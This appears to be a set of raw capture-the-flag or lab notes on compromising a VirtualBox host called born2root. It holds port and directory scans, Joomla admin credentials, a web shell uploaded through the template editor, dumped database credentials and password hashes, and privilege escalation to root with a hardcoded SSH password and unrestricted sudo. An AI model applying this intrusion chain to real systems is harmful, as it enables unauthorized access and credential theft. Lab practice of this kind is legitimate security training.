└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.15
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-14 09:40 CEST
Nmap scan report for 192.168.110.15
Host is up (0.0011s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 ec:61:97:9f:4d:cb:75:99:59:d4:c1:c4:d4:3e:d9:dc (DSA)
|   2048 89:99:c4:54:9a:18:66:f7:cd:8e:ab:b6:aa:31:2e:c6 (RSA)
|   256 60:be:dd:8f:1a:d7:a3:f3:fe:21:cc:2f:11:30:7b:0d (ECDSA)
|_  256 39:d9:79:26:60:3d:6c:a2:1e:8b:19:71:c0:e2:5e:5f (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Welcome to my website 
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33499/tcp   status
|   100024  1          46887/udp6  status
|   100024  1          50957/udp   status
|_  100024  1          56187/tcp6  status
33499/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:0A:1F:93 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.08 ms 192.168.110.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.08 seconds





└─$ dirb http://192.168.110.15 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Apr 14 11:29:41 2021
URL_BASE: http://192.168.110.15/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.110.15/ ----
==> DIRECTORY: http://192.168.110.15/css/                                                 
==> DIRECTORY: http://192.168.110.15/img/                                                 
+ http://192.168.110.15/index.html (CODE:200|SIZE:8454)                                   
==> DIRECTORY: http://192.168.110.15/javascript/                                          
==> DIRECTORY: http://192.168.110.15/joomla/                                              
==> DIRECTORY: http://192.168.110.15/js/                                                  
+ http://192.168.110.15/LICENSE (CODE:200|SIZE:1093)                                      
==> DIRECTORY: http://192.168.110.15/manual/                                              
+ http://192.168.110.15/server-status (CODE:403|SIZE:302)                                 
==> DIRECTORY: http://192.168.110.15/vendor/                                              
                                                                                          
---- Entering directory: http://192.168.110.15/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://192.168.110.15/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://192.168.110.15/javascript/ ----
==> DIRECTORY: http://192.168.110.15/javascript/jquery/                                   
                                                                                          
---- Entering directory: http://192.168.110.15/joomla/ ----
==> DIRECTORY: http://192.168.110.15/joomla/administrator/                                
==> DIRECTORY: http://192.168.110.15/joomla/bin/                                          
==> DIRECTORY: http://192.168.110.15/joomla/cache/                                        
==> DIRECTORY: http://192.168.110.15/joomla/components/                                   
==> DIRECTORY: http://192.168.110.15/joomla/images/                                       
==> DIRECTORY: http://192.168.110.15/joomla/includes/                                     
+ http://192.168.110.15/joomla/index.php (CODE:200|SIZE:8504)                             
==> DIRECTORY: http://192.168.110.15/joomla/language/                                     
==> DIRECTORY: http://192.168.110.15/joomla/layouts/                                      
==> DIRECTORY: http://192.168.110.15/joomla/libraries/                                    
==> DIRECTORY: http://192.168.110.15/joomla/media/                                        
==> DIRECTORY: http://192.168.110.15/joomla/modules/                                      
==> DIRECTORY: http://192.168.110.15/joomla/plugins/                                      
==> DIRECTORY: http://192.168.110.15/joomla/templates/                                    
==> DIRECTORY: http://192.168.110.15/joomla/tmp/     





http://192.168.110.15/joomla/administrator/
admin : travel

  Templates --> Template default for all pages --> New file --> Upload
http://192.168.110.15/joomla/templates/protostar/html/shell.php



        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'joomla';
        public $password = 'redhat';
        public $db = 'joomla';
        public $dbprefix = 'v3rlo_';
        public $live_site = '';
        public $secret = 'qognJLTotftnguG7';


mysql> select username, password from v3rlo_users;
select username, password from v3rlo_users;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$FX6CxjTiIwHGnsDmkxRQ2OouVh5NuxV1/6zqwtwX4zOBwadalPBsq |
+----------+--------------------------------------------------------------+



www-data@born2root:/opt/scripts$ cat fileshare.py
cat fileshare.py
#!/usr/bin/env python

import sys, paramiko

if len(sys.argv) < 5:
    print "args missing"
    sys.exit(1)

hostname = "localhost"
password = "lulzlol"
source = "/var/www/html/joomla"
dest = "/tmp/backup/joomla"

username = "tim"
port = 22

try:
    t = paramiko.Transport((hostname, port))
    t.connect(username=username, password=password)
    sftp = paramiko.SFTPClient.from_transport(t)
    sftp.get(source, dest)

finally:
    t.close()


tim@born2root:~$ sudo -l
sudo -l
[sudo] password for tim: lulzlol

Matching Defaults entries for tim on born2root:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tim may run the following commands on born2root:
    (ALL : ALL) ALL
tim@born2root:~$ 

tim@born2root:~$ sudo id
sudo id
uid=0(root) gid=0(root) groups=0(root)



Program python pour tester authentification joomla



